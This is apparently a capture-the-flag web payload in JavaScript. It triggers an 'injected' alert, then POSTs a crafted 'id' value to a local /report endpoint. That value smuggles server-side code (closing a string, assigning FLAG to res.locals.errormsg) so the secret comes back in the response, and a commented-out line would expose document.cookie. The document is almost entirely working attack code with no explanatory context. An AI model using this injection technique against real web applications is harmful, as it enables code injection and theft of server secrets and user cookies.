alert("injected");

fetch("http://localhost/report", {
  method: "POST",
  body: new URLSearchParams({
    'id': '");res.locals.errormsg = FLAG;return;//'
  }),
  headers: {
    "Content-Type": "application/x-www-form-urlencoded"
  }
})
.then(response => {
  if (!response.ok) {
    throw new Error(`HTTP error! Status: ${response.status}`);
  }
  return response.text();
})
.then(html => {
  console.log(html); // Log the HTML code of the page
})
.catch(error => {
  console.error('Fetch Error:', error);
});

//alert(document.cookie);